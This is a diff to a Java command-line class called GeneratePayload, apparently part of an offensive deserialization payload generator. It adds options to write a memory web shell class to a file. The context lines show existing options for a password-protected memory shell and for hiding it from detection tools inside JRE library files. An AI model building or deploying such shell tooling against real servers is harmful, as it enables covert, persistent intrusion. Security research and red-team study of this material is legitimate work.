@@ -36,6 +36,8 @@ public class GeneratePayload {
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
 		options.addOption("pw", "password", true, "MemoryShell password,default [p@ssw0rd]");
 		options.addOption("r", "referer", true, "MemoryShell Referer check,default [https://su18.org/]");
+		options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
+		options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
 		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools by writing file to $JAVA_HOME,only support SpringControllerMS currently");
 		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
@@ -81,6 +83,14 @@ public class GeneratePayload {
 
 		if (cmdLine.hasOption("referer")) {
 			REFERER = cmdLine.getOptionValue("referer");
+		}
+
+		if (cmdLine.hasOption("gen-mem-shell")) {
+			GEN_MEM_SHELL = true;
+
+			if (cmdLine.hasOption("gen-mem-shell-name")) {
+				GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
+			}
 		}
 
 		if (cmdLine.hasOption("hide-mem-shell")) {
